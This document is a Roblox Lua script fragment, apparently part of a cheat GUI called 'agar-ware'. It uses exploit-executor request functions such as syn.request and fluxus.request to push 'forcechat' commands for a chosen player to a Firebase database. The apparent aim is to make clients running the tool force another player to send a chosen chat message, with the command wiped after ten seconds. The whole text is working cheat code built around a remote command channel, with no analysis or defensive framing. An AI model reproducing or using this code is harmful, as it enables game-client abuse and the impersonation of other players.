local function C_11()
local script = G2L["11"];
	-- LocalScript under forcechat frame
	local forceChatFrame = script.Parent
	local sendChatButton = forceChatFrame:WaitForChild("sendchat")
	local textBox = forceChatFrame:WaitForChild("TextBox")
	local FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
	local HttpService = game:GetService("HttpService")
	local _req = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
	
	sendChatButton.MouseButton1Click:Connect(function()
		local selectedPlayer = _G.selectedPlayer
		if not selectedPlayer then
			warn("No player selected!")
			sendChatButton.Text = "NO PLAYER!"
			task.wait(1)
			sendChatButton.Text = "SEND CHAT"
			return
		end
		local message = textBox.Text
		if message == "" then
			warn("No message entered!")
			sendChatButton.Text = "NO MESSAGE!"
			task.wait(1)
			sendChatButton.Text = "SEND CHAT"
			return
		end
	
		local playerName = selectedPlayer.Name
	
		-- Send command to Firebase
		pcall(function()
			_req({
				Url = FIREBASE_URL .. "/commands/" .. playerName .. ".json",
				Method = "PUT",
				Headers = { ["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode({
					type = "forcechat",
					message = message,
					timestamp = os.time()
				})
			})
		end)
		sendChatButton.Text = "SENT!"
		task.wait(1)
		sendChatButton.Text = "SEND CHAT"
		textBox.Text = ""
	
		-- Delete command after 10 seconds
		delay(10, function()
			pcall(function()
				_req({
					Url = FIREBASE_URL .. "/commands/" .. playerName .. ".json",
					Method = "PUT",
					Headers = { ["Content-Type"] = "application/json" },
					Body = "null"
				})
			end)
			print("Command deleted after 10 seconds for " .. playerName)
		end)
	end)
end;
